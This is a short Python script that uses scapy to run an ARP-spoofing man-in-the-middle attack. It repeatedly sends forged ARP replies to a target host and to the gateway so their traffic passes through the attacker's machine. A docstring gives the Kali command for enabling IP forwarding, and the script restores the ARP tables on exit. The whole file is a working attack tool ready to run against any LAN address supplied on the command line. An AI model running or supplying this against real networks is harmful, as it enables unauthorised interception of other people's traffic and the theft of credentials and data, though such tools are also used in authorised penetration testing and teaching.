#!/usr/bin/env python3

# pip install scapy

"""
Kali machine needs to allow packets with IP Forwarding(Run following command in terminal):
echo 1 > /proc/sys/net/ipv4/ip_forward
"""

import scapy.all as scapy
import time
import sys
import argparse

def get_arguments(): # gets arguments and IP Addresses from the user
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP of the target computer.")
    parser.add_argument("-g" , "--gateway", dest="gateway", help="IP of the gateway.")
    (options) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP for the target computer.")
    elif not options.gateway:
        parser.error("[-] Please specify a an IP for the gateway.")
    return options

def get_mac(ip): # Takes an IP input and returns the MAC Address associated with it
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip): # Used for spoofing target and machine ARP Tables
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) # Sends the packet

def restore(destination_ip, source_ip): # Used for restoring ARP Tables
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,verbose=False) # Sends the packet

def main():
    options = get_arguments()
    try:
        sent_packets_count = 0
        while True:
            spoof(options.target, options.gateway) # Spoofing the machine
            spoof(options.gateway, options.target) # Spoofing the gateway
            sent_packets_count += 2
            print(f"\r[+] Packets Sent: {str(sent_packets_count)}", end=" ")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[+] Resetting ARP Tables")
        restore(options.target, options.gateway) # Resetting the machines ARP Table
        restore(options.gateway, options.target) # Resetting the gateways ARP Table
        print("[+] ARP Tables Reset Successfully")
        print("[+] Quitting Application")

if __name__ == "__main__":
    main()